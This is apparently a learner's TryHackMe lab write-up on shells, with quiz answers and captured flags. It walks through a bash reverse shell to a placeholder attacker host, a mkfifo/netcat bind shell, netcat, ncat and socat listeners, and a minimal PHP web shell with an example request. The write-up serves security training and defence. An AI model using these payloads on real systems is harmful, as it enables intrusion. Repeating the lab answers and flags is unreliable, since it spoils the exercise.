# TryHackMe: Shells Overview

## Room Information

| Category | Offensive Security Tooling |
|----------|----------------------------|
| Platform | TryHackMe |
| Difficulty | Beginner |
| Topic | Shell Fundamentals |
| Estimated Time | 60 minutes |

---

## Overview

Shells are one of the most fundamental concepts in offensive security. Attackers and penetration testers frequently rely on shells to remotely control compromised systems, execute commands, escalate privileges, and move laterally through a network.

This room provides an overview of several types of shells used during exploitation and post-exploitation activities. It also demonstrates how shells operate, how attackers deploy them, and how defenders can identify them.

Understanding shells is essential for cybersecurity professionals because they appear throughout the attack lifecycle, especially during:

- Initial system compromise
- Privilege escalation
- Persistence
- Post-exploitation operations

In this room, I explored how reverse, bind, and web shells work and how various utilities can be used to establish and manage shell connections.

---

## Skills Demonstrated

- Understanding shell fundamentals
- Reverse shell concepts
- Bind shell concepts
- Web shell exploitation techniques
- Shell listener configuration
- Reverse shell payload analysis
- Post-exploitation shell usage

---

## Key Concepts

### What is a Shell?

A shell is a program that allows users to interact with an operating system. While shells can exist in graphical environments, in cybersecurity, they typically refer to **command-line shells** that allow execution of commands on a system.

When attackers compromise a machine, gaining shell access allows them to control the system remotely.

Common attacker activities after obtaining a shell include:

- Remote command execution
- Privilege escalation
- Data exfiltration
- Persistence creation
- Lateral movement
- Network pivoting

---

## Task 2 — Shell Overview

Shell access is a critical component of post-exploitation.

Once attackers gain shell access, they may:

- Run commands on the system
- Search for credentials
- Deploy malware or persistence mechanisms
- Pivot to other machines on the network

### Question Answers

Command-line interface used to interact with an operating system:

**Shell**

Using a compromised system to attack additional machines is called:

**Pivoting**

Common activity used to gain higher privileges:

**Privilege Escalation**

---

## Task 3 — Reverse Shell

A reverse shell is one of the most common shell techniques used in offensive security.

Instead of the attacker connecting to the victim machine, the compromised system initiates a connection back to the attacker’s machine.

This method is commonly used because:

- Firewalls often block inbound connections
- Outbound connections are usually allowed
- It blends with normal network traffic

### Reverse Shell Workflow

1. The attacker starts a listener on their system.
2. The victim executes a reverse shell payload.
3. The victim connects back to the attacker.
4. The attacker gains command-line access.

Example listener setup using Netcat:

```
nc -lvnp 443
```

Explanation:

- `-l` enables listening mode
- `-v` enables verbose output
- `-n` disables DNS resolution
- `-p` specifies the listening port

Common ports used by attackers include:

- 53
- 80
- 443
- 8080
- 139
- 445

Using common ports helps disguise malicious traffic.

### Question Answers

Type of shell where the target connects back to the attacker:

**Reverse Shell**

A tool commonly used to listen for incoming shells:

**Netcat**

---

## Task 4 — Bind Shell

A bind shell works in the opposite direction of a reverse shell.

Instead of connecting outward, the compromised machine **opens a listening port** and waits for the attacker to connect.

The attacker then connects to the exposed port to obtain shell access.

### Bind Shell Workflow

1. The attacker executes a bind shell payload on the target.
2. The target machine opens a listening port.
3. The attacker connects to the open port.
4. A remote shell session is established.

Example bind shell listener on the target:

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Attacker connects using:

```
nc -nv TARGET_IP 8080
```

Bind shells are less commonly used because:

- They require open inbound ports
- Listening services can be detected more easily

### Question Answers

Shell type that opens a listening port on the target:

**Bind Shell**

Ports requiring elevated privileges:

**1024**

---

## Task 5 — Shell Listeners

Shell listeners allow attackers to receive incoming shell connections.

Several utilities can be used to handle incoming shell sessions.

### rlwrap

`rlwrap` improves shell usability by adding:

- Command history
- Arrow key navigation
- Better terminal interaction

Example:

```
rlwrap nc -lvnp 443
```

### Ncat

`Ncat` is an enhanced version of Netcat included with the Nmap suite.

Features include:

- SSL-encrypted connections
- Improved reliability
- Additional networking options

Example listener:

```
ncat -lvnp 443
```

Example encrypted listener:

```
ncat --ssl -lvnp 443
```

### Socat

`Socat` is a powerful networking tool that can connect multiple communication channels.

Example listener:

```
socat -d -d TCP-LISTEN:443 STDOUT
```

Socat is widely used during advanced shell handling because it provides better session stability than Netcat.

### Question Answers

A tool used to create socket connections between two data sources:

**socat**

Utility providing command history and editing:

**rlwrap**

Improved Netcat tool from the Nmap project:

**ncat**

---

## Task 6 — Shell Payloads

Shell payloads are commands or scripts used to expose a shell over a network.

They typically establish either:

- Reverse shells
- Bind shells

Several programming languages and utilities can be used to generate shell payloads.

### Bash Reverse Shell

Example:

```
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

This command redirects input and output through a TCP connection to the attacker.

### PHP Reverse Shell

PHP reverse shells commonly use functions such as:

- `exec`
- `shell_exec`
- `system`
- `passthru`
- `popen`

These functions allow command execution when a remote connection is established.

### Python Reverse Shell

Python reverse shells often use the following modules:

- `socket`
- `subprocess`
- `pty`

These allow attackers to create network connections and spawn shell processes remotely.

### Question Answers

Python module commonly used for shell command execution:

**subprocess**

Language that uses functions like `exec` and `system` for shell execution:

**PHP**

Language capable of exporting environment variables for reverse shells:

**Python**

---

## Task 7 — Web Shell

A web shell is a malicious script uploaded to a compromised web server that allows attackers to execute commands through a web browser.

Web shells are frequently used after exploiting vulnerabilities such as:

- Unrestricted file upload
- File inclusion vulnerabilities
- Command injection
- Remote code execution

### Example PHP Web Shell

```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Once uploaded to a vulnerable server, attackers can execute commands through the browser.

Example:

```
http://victim.com/uploads/shell.php?cmd=whoami
```

### Common Web Shell Frameworks

Several prebuilt web shells exist online, including:

- p0wny-shell
- b374k shell
- c99 shell

These shells provide advanced features such as:

- File management
- Command execution
- System enumeration
- Credential extraction

### Question Answers

Vulnerability allowing malicious file uploads:

**Unrestricted File Upload**

Malicious script used to control a web server:

**Web Shell**

---

## Task 8 — Practical Exploitation

The final task involved exploiting two vulnerabilities on a target machine.

The goal was to gain shell access and retrieve flags stored on the system.

### Command Injection Exploitation

A reverse or bind shell was used to exploit a command injection vulnerability.

Retrieved flag:

**THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}**

### Web Shell Exploitation

A web shell was uploaded to exploit an unrestricted file upload vulnerability.

Retrieved flag:

**THM{202bb14ed12120b31300cfbbbdd35998786b44e5}**

---

## Defensive Takeaways

Organizations can reduce shell-based attacks by implementing the following protections:

- Input validation for web applications
- File upload restrictions
- Web application firewalls
- Network monitoring for unusual connections
- Endpoint detection for shell activity

Security teams should also monitor for suspicious outbound connections and abnormal command execution patterns.

---

## Conclusion

This room provided a foundational understanding of how shells function in offensive security.

The following shell types were explored:

- Reverse Shells — initiate connections from the target back to the attacker
- Bind Shells — expose a listening port on the target machine
- Web Shells — allow command execution through web applications

Understanding these techniques is critical for both penetration testers and defenders, as shell access is frequently used during real-world cyberattacks.

Mastering shell concepts helps security professionals recognize attack patterns, detect malicious activity, and strengthen defensive controls.
